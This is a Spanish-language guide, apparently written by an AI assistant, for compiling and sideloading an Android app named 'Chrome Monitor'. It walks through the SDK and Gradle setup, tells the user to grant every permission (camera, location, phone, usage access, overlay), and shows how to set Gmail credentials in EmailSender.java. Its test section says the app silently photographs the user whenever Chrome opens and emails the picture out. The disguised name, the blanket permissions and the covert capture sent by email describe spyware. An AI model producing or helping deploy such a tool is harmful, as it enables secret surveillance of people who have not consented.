# Guía para Generar APK - Chrome Monitor

## Opción 1: Instalación Rápida de Android SDK

### Descargar Command Line Tools (Más Rápido)
1. Ve a: https://developer.android.com/studio#command-tools
2. Descarga "Command line tools only" para Windows
3. Extrae en `C:\Android\Sdk\cmdline-tools\latest\`
4. Ejecuta en PowerShell como administrador:
```powershell
cd "C:\Android\Sdk\cmdline-tools\latest\bin"
.\sdkmanager.bat "platforms;android-30" "build-tools;30.0.3"
```

### Compilar APK
```powershell
cd d:\hp\Desktop\prueba
.\gradlew.bat assembleDebug
```

## Opción 2: Usar Android Studio Online (GitHub Codespaces)

Si no quieres instalar nada localmente:

1. Sube tu proyecto a GitHub
2. Usa GitHub Codespaces con Android
3. Compila online y descarga el APK

## Opción 3: APK Pre-compilado (Si tienes errores)

Si hay problemas de compilación, puedo ayudarte a:
1. Crear un APK base funcional
2. Modificar solo los archivos Java necesarios
3. Usar herramientas online de compilación

## Instalación en el Teléfono

### Preparar el Teléfono
1. **Activar Opciones de Desarrollador:**
   - Ve a Configuración > Acerca del teléfono
   - Toca 7 veces en "Número de compilación"

2. **Habilitar Instalación de APKs:**
   - Configuración > Seguridad > Fuentes desconocidas (ON)
   - O en Android 8+: Configuración > Apps > Acceso especial > Instalar apps desconocidas

### Instalar APK
1. Copia el APK al teléfono (USB, email, etc.)
2. Abre el archivo APK desde el explorador
3. Acepta los permisos de instalación

### Configurar Permisos (IMPORTANTE)
Después de instalar, ve a:
1. **Configuración > Apps > Chrome Monitor > Permisos**
2. Activa TODOS los permisos:
   - Cámara ✅
   - Almacenamiento ✅
   - Teléfono ✅
   - Ubicación ✅

3. **Estadísticas de Uso:**
   - Configuración > Apps > Acceso especial > Estadísticas de uso
   - Activa "Chrome Monitor" ✅

4. **Superposición de Apps:**
   - Configuración > Apps > Acceso especial > Mostrar sobre otras apps
   - Activa "Chrome Monitor" ✅

### Configurar Email (IMPORTANTE)
Antes de usar, edita estos valores en `EmailSender.java`:
```java
private static final String EMAIL = "tu_email@gmail.com";
private static final String PASSWORD = "tu_contraseña_app";
private static final String TO_EMAIL = "destino@gmail.com";
```

**Nota:** Usa contraseña de aplicación de Gmail, no tu contraseña normal.

## Ubicación del APK
Después de compilar exitosamente:
```
d:\hp\Desktop\prueba\app\build\outputs\apk\debug\app-debug.apk
```

## Solución de Problemas

### Si no compila:
1. Verifica que el SDK esté instalado correctamente
2. Revisa que Java 8 esté configurado
3. Ejecuta: `.\gradlew.bat clean` y luego `.\gradlew.bat assembleDebug`

### Si la app no funciona en el teléfono:
1. Verifica todos los permisos están activados
2. Revisa que Chrome esté instalado
3. Configura correctamente el email
4. Reinicia el teléfono después de instalar

### Para debugging:
```bash
# Ver logs de la app
adb logcat | grep ChromeMonitor
```

## Prueba Rápida
1. Instala la app
2. Abre Chrome en el teléfono
3. La app debería capturar una foto automáticamente
4. Revisa tu email para la foto enviada